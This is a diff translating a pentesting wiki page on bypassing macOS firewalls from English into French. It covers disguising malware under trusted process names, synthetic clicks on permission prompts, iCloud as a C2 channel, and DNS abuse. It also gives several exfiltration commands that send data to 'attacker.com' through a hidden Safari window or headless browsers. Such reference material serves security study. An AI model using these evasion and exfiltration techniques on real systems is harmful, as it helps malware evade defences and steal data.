@@ -2,84 +2,74 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Found techniques
+## Techniques trouvées
 
-The following techniques were found working in some macOS firewall apps.
+Les techniques suivantes ont été trouvées fonctionnant dans certaines applications de pare-feu macOS.
 
-### Abusing whitelist names
+### Abus des noms de liste blanche
 
-- For example calling the malware with names of well known macOS processes like **`launchd`**
+- Par exemple, appeler le malware avec des noms de processus macOS bien connus comme **`launchd`**
 
-### Synthetic Click
+### Clic synthétique
 
-- If the firewall ask for permission to the user make the malware **click on allow**
+- Si le pare-feu demande la permission à l'utilisateur, faire en sorte que le malware **clique sur autoriser**
 
-### **Use Apple signed binaries**
+### **Utiliser des binaires signés par Apple**
 
-- Like **`curl`**, but also others like **`whois`**
+- Comme **`curl`**, mais aussi d'autres comme **`whois`**
 
-### Well known apple domains
+### Domaines Apple bien connus
 
-The firewall could be allowing connections to well known apple domains such as **`apple.com`** or **`icloud.com`**. And iCloud could be used as a C2.
+Le pare-feu pourrait autoriser les connexions vers des domaines Apple bien connus tels que **`apple.com`** ou **`icloud.com`**. Et iCloud pourrait être utilisé comme un C2.
 
-### Generic Bypass
+### Contournement générique
 
-Some ideas to try to bypass firewalls
+Quelques idées pour essayer de contourner les pare-feu
 
-### Check allowed traffic
+### Vérifier le trafic autorisé
 
-Knowing the allowed traffic will help you identify potentially whitelisted domains or which applications are allowed to access them
-
+Connaître le trafic autorisé vous aidera à identifier les domaines potentiellement sur liste blanche ou quelles applications sont autorisées à y accéder.
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
+### Abuser du DNS
 
-### Abusing DNS
-
-DNS resolutions are done via **`mdnsreponder`** signed application which will probably vi allowed to contact DNS servers.
+Les résolutions DNS sont effectuées via l'application signée **`mdnsreponder`** qui sera probablement autorisée à contacter les serveurs DNS.
 
 <figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
 
-### Via Browser apps
+### Via les applications de navigateur
 
 - **oascript**
-
 ```applescript
 tell application "Safari"
-    run
-    tell application "Finder" to set visible of process "Safari" to false
-    make new document
-    set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
+run
+tell application "Finder" to set visible of process "Safari" to false
+make new document
+set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
 end tell
 ```
-
 - Google Chrome
-
 ```bash
 "Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
 ```
-
 - Firefox
-
 ```bash
 firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```
-
 - Safari
-
 ```bash
 open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
+### Via injections de processus
 
-### Via processes injections
-
-If you can **inject code into a process** that is allowed to connect to any server you could bypass the firewall protections:
+Si vous pouvez **injecter du code dans un processus** qui est autorisé à se connecter à n'importe quel serveur, vous pourriez contourner les protections du pare-feu :
 
 {{#ref}}
 macos-proces-abuse/
 {{#endref}}
 
-## References
+## Références
 
 - [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
 
